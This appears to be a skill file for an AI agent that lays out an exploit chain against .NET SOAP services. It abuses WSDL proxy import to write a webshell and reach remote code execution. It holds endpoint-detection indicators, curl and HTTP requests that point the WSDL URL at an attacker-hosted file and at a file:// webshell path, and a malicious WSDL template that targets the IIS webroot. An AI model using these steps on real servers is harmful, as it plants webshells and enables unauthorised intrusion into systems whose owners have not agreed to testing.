---
name: soapwn-wsdl-rce
description: Exploit .NET WSDL proxy (HttpWebClientProtocol) to achieve arbitrary file write and RCE via SOAP service import. Use when .NET SOAP/WCF/ASMX endpoints detected.
---

# SOAPwn — .NET WSDL Proxy RCE

## Pattern
- .NET application consumes external SOAP services via WSDL import
- `HttpWebClientProtocol` or `SoapHttpClientProtocol` used to generate client proxy
- Application fetches WSDL from user-influenced URL

## Mechanism
1. .NET's `HttpWebClientProtocol` accepts a URL to fetch a WSDL definition
2. Supply a `file://` URI instead of `http://`
3. A silent type cast failure occurs during deserialization
4. The framework writes the fetched content to disk as `.aspx` or `.cshtml`
5. Result: arbitrary file write → webshell → RCE

## Detection
Look for indicators of .NET SOAP consumption:

```
*.asmx          — ASP.NET Web Services
*.svc           — WCF Services
?wsdl           — WSDL endpoint suffix
?disco          — Discovery document
/Service1.asmx?WSDL
```

Response headers:
```http
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
Server: Microsoft-IIS/10.0
```

Body indicators:
```xml
<wsdl:definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
<soap:address location="..."/>
```

## Exploit Steps

### 1. Confirm WSDL endpoint
```bash
curl -x localhost:8080 -k "https://target.com/Service.asmx?WSDL"
```
Look for valid WSDL XML response with service definitions.

### 2. Test URL parameter influence
Find where the application imports external WSDL:
```http
POST /api/import-service HTTP/1.1
Content-Type: application/json

{"wsdlUrl": "http://attacker.com/evil.wsdl"}
```
Or via SOAP headers:
```xml
<wsdl:import namespace="http://target.com/" location="http://attacker.com/evil.wsdl"/>
```

### 3. Attempt file:// protocol
```http
POST /api/import-service HTTP/1.1
Content-Type: application/json

{"wsdlUrl": "file:///C:/inetpub/wwwroot/shell.aspx"}
```

### 4. Craft malicious WSDL
Host a WSDL that, when processed, writes a webshell:
```xml
<?xml version="1.0" encoding="utf-8"?>
<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
  <wsdl:types>
    <xsd:schema>
      <!-- Schema that triggers code generation to disk -->
    </xsd:schema>
  </wsdl:types>
  <wsdl:service name="Evil">
    <wsdl:port binding="tns:EvilBinding">
      <soap:address location="file:///C:/inetpub/wwwroot/cmd.aspx"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>
```

## Prerequisites
- Target runs .NET (IIS, ASP.NET)
- Application imports or consumes external SOAP/WSDL definitions
- User can influence the WSDL URL parameter
- `file://` protocol not blocked at network or application layer

## Key Insight
The vulnerability is in .NET's WSDL proxy generation pipeline — the silent cast failure during import means the framework doesn't validate the output path. This turns a seemingly benign "import service" feature into arbitrary file write with webshell potential.
